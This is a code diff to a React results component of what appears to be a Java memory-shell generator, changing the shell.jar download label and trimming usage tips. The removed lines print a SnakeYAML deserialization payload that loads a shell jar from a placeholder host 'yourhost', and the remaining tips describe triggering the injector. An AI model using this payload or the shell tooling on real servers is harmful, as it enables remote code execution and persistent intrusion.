@@ -30,7 +30,7 @@ export function JarResult({
         <ol className="list-decimal list-inside space-y-4 text-sm">
           <li className="flex items-center justify-between">
             <span>
-              {t("common:download")} shell.jar (
+              {t("common:download")} {packMethod}Shell.jar (
               {formatBytes(atob(packResult).length)})
             </span>
             <Button
@@ -50,28 +50,8 @@ export function JarResult({
             </Button>
           </li>
           <Separator />
-          {isPureJar ? (
-            <>
-              <li>{t("memshell:tips.download-jar")}</li>
-              <li>{t("memshell:tips.trigger-injector-class-loading")}</li>
-            </>
-          ) : (
-            <>
-              <li>{t("memshell:tips.download-jar")}</li>
-              <li>{t("memshell:tips.load-jar-with-scriptenginemanager")}</li>
-              <CodeViewer
-                code={`!!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [[
-    !!java.net.URL ["http://yourhost/shell.jar"]
-  ]]
-]`}
-                language="java"
-                showLineNumbers={false}
-                wrapLongLines={true}
-                header={<div className="text-xs">SnakeYaml Payload</div>}
-              />
-            </>
-          )}
+          <li>{t("memshell:tips.download-jar")}</li>
+          <li>{t("memshell:tips.trigger-injector-class-loading")}</li>
         </ol>
       </CardContent>
     </Card>
